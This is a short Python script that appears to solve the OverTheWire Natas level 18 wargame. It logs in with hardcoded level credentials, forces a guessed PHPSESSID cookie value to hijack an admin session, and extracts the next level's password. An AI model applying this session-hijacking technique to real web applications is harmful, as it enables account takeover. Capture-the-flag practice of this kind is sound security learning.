import requests
import re

username = 'natas18'
password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'

url = f"http://{username}.natas.labs.overthewire.org/"

response = requests.post(url, auth = (username, password), cookies = {"PHPSESSID" : "119"})

print(re.findall('Password: (.*)</pre>', response.text)[0])